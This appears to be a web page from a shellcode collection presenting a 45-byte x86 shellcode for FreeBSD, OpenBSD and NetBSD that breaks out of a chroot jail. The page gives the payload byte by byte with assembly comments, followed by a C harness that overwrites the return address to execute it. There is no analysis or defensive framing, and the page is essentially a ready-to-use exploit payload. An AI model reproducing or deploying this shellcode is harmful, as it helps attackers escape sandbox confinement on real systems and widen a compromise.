<html><head><title>BSD/x86 - break chroot 45 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   45 bytes.

   -break chrooted
*/

char shellcode[]=

    &quot;\x68\x62\x2e\x2e\x2e&quot; /* pushl   $0x2e2e2e62            */
    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
    &quot;\x33\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\x88\x47\x03&quot;         /* movb    %al,0x3(%edi)          */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\xb0\x88&quot;             /* movb    $0x88,%al              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\xb0\x3d&quot;             /* movb    $0x3d,%al              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x47&quot;                 /* incl    %edi                   */
    &quot;\x33\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\xff&quot;             /* movb    $0xff,%cl              */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\xb0\x0c&quot;             /* movb    $0x0c,%al              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\xe2\xfa&quot;             /* loop    &lt;shellcode +31&gt;        */
    &quot;\x47&quot;                 /* incl    %edi                   */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\xb0\x3d&quot;             /* movb    $0x3d,%al              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\xcd\x80&quot;;            /* int     $0x80                  */

main()
{
   int *ret;
   printf(&quot;Shellcode lenght=%d\n&quot;,sizeof(shellcode));
   ret=(int*)&amp;ret+2;
   (*ret)=(int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
